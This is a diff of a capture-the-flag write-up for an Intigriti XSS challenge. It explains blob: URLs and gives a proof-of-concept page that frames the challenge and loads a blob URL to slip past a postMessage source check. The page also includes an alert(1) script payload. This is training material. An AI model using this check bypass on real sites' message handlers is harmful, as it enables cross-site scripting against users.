@@ -453,13 +453,61 @@ There it says `self` meaning the same origin as the app. `challenge-0922.intigri
 And then `blob:`. This one is very interesting because we as attackers can create
 blob urls. It's as simple as.
 ```
-  blobUrl = URL.createObjectURL(new Blob(['<h1>hello</h1>'], {type : 'text/html'})
+  blobUrl = URL.createObjectURL(new Blob(['<h1>hello</h1><script>alert(1)</script>'], {type : 'text/html'}))
 ```
-And depending on from which context this is run you will get an URL looking similar to 
+And depending on from which context this was run in you will get an URL looking similar to 
 this `blob:null/f38316a2-5232-4414-9bd2-1be6f65e2226`
 
-The browser itself created an html file with the contents `<h1>hello</h1>` internally. 
-That's why only the browser window that created the URL can open it.
+If we would open this URL we would see a big "hello" and an alert popup.
+The browser itself created this file internally. And that's why only the 
+browser window that created the URL can open it.
+
+But how will this new knowledge help us tricking?
+
+```
+window.addEventListener('message', e => {
+  if (e.source !== document.querySelector('#ball').contentWindow){
+    e.stopImmediatePropagation();
+  }
+});
+```
+Well we could load the `<iframe>` of `magic.php` with the id of `ball`
+a blob URL which we have full control over. From that "blobbed" file we will then
+send a `postMessage` to the parent. That way `e.source` will be equal to `document.querySelector('#ball').contentWindow`
+
+Something like this https://editor.43z.one/15kr5
+```
+<iframe onload=run() id=i src="https://challenge-0922.intigriti.io/challenge/"></iframe>
+<script>
+  run = e => {
+    burl = URL.createObjectURL(new Blob([`
+      <script>
+        parent.postMessage('hello!', '*') 
+      <`+`/script>
+    `], {type : 'text/html'}))
+    i.contentWindow.frames[0].location = burl 
+  }
+</script>
+```
+If we check the console we will see the `hello!`. This comes directly from the
+default case of the switch we wanted to get at. That also means we successfully tricked
+the 
+```
+if (e.source !== document.querySelector('#ball').contentWindow){
+  e.stopImmediatePropagation();
+}
+```
+and got until there
+
+```
+addEventListener('message', e => {
+  switch(e.data.action){
+    ...
+    default:
+      console.log(e.data); // <------- We've come so far
+  }
+});
+```
 
 
 
